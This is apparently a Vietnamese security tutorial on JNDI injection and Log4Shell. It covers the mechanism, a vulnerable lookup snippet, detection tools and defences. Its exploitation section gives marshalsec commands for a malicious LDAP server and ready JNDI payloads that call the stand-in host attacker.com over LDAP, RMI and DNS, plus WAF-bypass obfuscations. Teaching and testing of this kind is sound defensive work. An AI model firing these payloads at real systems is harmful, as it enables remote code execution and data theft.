1. JNDI Injection là gì?

    JNDI (Java Naming and Directory Interface) là API trong Java giúp app kết nối dịch vụ bên ngoài (LDAP, RMI, DNS, CORBA, ...).

    JNDI Injection là lỗ hổng khi attacker kiểm soát (toàn phần hoặc một phần) lookup string mà app Java dùng để tra cứu resource, cho phép thực thi code độc hại trên máy chủ, thường dẫn đến Remote Code Execution (RCE).

2. Cơ chế hoạt động của JNDI Injection

    Một số ứng dụng Java có thể nhận input (từ user, request, config...) rồi chèn thẳng vào chuỗi JNDI lookup:

String jndiUrl = request.getParameter("jndi");
Context ctx = new InitialContext();
ctx.lookup(jndiUrl); // ĐẦU VÀO KHÔNG KIỂM SOÁT!

Nếu attacker gửi:

    ldap://attacker.com/a

    Ứng dụng sẽ truy cập đến LDAP/RMI server của attacker và tải Java object về, dẫn đến RCE nếu đối tượng có mã độc.

3. JNDI Injection phổ biến ở đâu?

    Các framework, lib logging (như Log4j – CVE-2021-44228), ứng dụng Java EE cũ, servlet custom, code dùng “lookup” với chuỗi user-controlled.

    Hay gặp trong: logging, cấu hình động, integration với dịch vụ ngoài, hoặc custom SSO/LDAP module.

4. Các giao thức JNDI nguy hiểm

    LDAP: Phổ biến nhất, attacker dựng LDAP server giả.

    RMI: Remote Method Invocation, attacker dựng RMI server.

    DNS: Exfiltration thông tin.

    CORBA, NIS, ... (ít gặp hơn).

5. Demo khai thác JNDI Injection (thực tế)

    Chỉ thử nghiệm trên hệ thống bạn được phép!

A. Chuẩn bị server độc hại

    Dựng LDAP hoặc RMI server (dùng JNDIExploit, marshalsec):

        JNDIExploit

        marshalsec

    git clone https://github.com/mbechler/marshalsec.git
    cd marshalsec
    mvn clean package -DskipTests
    java -cp target/marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8080/#Exploit"

    Host Java payload (mã độc) tại attacker.com:8080 (có thể chỉ là reverse shell, hoặc print “pwned!”)

B. Gửi payload vào app vulnerable

    Gửi input tới parameter, header, field bị log hoặc trực tiếp bị lookup:

    ldap://attacker.com:1389/a

    Nếu app lookup JNDI không kiểm soát, nó sẽ callback về attacker, tải mã độc và thực thi.

6. Các dạng JNDI Payload phổ biến

    LDAP:

ldap://attacker.com:1389/a

RMI:

rmi://attacker.com:1099/a

DNS exfil:

${jndi:dns://yourdomain/xyz}

Bypass filter:

    ${${::-j}ndi:ldap://attacker.com:1389/a}

    (obfuscation để bypass WAF)

7. Nhận diện và kiểm thử JNDI Injection
A. Kiểm thử thủ công

    Tìm các param, header, field nghi ngờ bị lookup.

    Gửi payload chứa đường dẫn về server bạn kiểm soát (LDAP, RMI, DNS).

    Dùng Burp Collaborator, Interactsh hoặc ngrok để lắng nghe callback.

    Xem log của bạn hoặc sử dụng dịch vụ “canarytoken” để nhận alert.

B. Dùng công cụ tự động

    Nuclei template (CVE-2021-44228 hoặc custom jndi-injection.yaml)

    nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

    log4j-scan (dùng cho audit hàng loạt):
    https://github.com/fullhunt/log4j-scan

    Burp Extension: Log4Shell scanner, Collaborator.

8. Bypass, biến thể và detection nâng cao

    Biến thể payload:

        Sử dụng ${${::-j}ndi:ldap://...} hoặc ${jndi:${lower:l}${lower:d}ap://...} để tránh filter.

    Phát hiện blind:

        Dùng DNS callback (nếu firewall chặn LDAP/RMI).

    Đọc code (source review):

        Kiểm tra mọi đoạn code có sử dụng .lookup(), .bind(), .rebind(), .list(), .search() với đầu vào không kiểm soát.

9. Hậu quả và khả năng khai thác nâng cao

    RCE: Điều khiển hoàn toàn server (nếu deserialization class path đủ điều kiện).

    File Read/Write: Nếu JNDI cho phép tải/thay đổi file cấu hình.

    Lateral movement: Tấn công pivot sang các máy khác trong network (vì Java app thường chạy với quyền cao).

    Exfiltration: Rò rỉ biến môi trường, thông tin mật, secret key qua DNS hoặc HTTP.

10. Phòng chống JNDI Injection
A. Không bao giờ để user input đi vào JNDI lookup

    Chỉ lookup các giá trị đã whitelist/hardcode.

B. Cập nhật framework, log4j, dependency

    Luôn dùng bản mới nhất (Log4j >=2.17.0), tắt tính năng JNDI nếu không cần thiết.

C. Chặn outbound connection trên server

    Giới hạn server Java không được kết nối outbound tới Internet (đặc biệt là LDAP, RMI, DNS bên ngoài).

D. Harden JVM

    Dùng SecurityManager (mặc dù đã deprecated, vẫn hữu ích).

    Chặn tải class từ xa trong policy.

E. WAF/IDS

    Dò traffic có payload ${jndi:, ldap://, rmi://...

    Phát hiện biến thể encode, bypass.

11. Tài liệu, demo và link hữu ích

    JNDI Exploit Kit

    marshalsec

    Log4j RCE Research (lunasec)

    OWASP Log4j Vulnerability Guidance

    Nuclei Template CVE-2021-44228

    Burp Suite Collaborator

Tóm tắt nhanh

    JNDI Injection là một trong những kiểu bug nguy hiểm nhất trên ứng dụng Java, cho phép RCE nếu bị khai thác.

    Luôn kiểm soát đầu vào với mọi chuỗi lookup, cập nhật framework, chặn outbound network, rà soát code kỹ lưỡng.

    Có thể phát hiện bằng tool tự động hoặc thủ công, dùng dịch vụ callback để test blind.

    Đã từng gây ra thảm họa với Log4j/Log4Shell nhưng còn có thể xuất hiện ở Java app khác!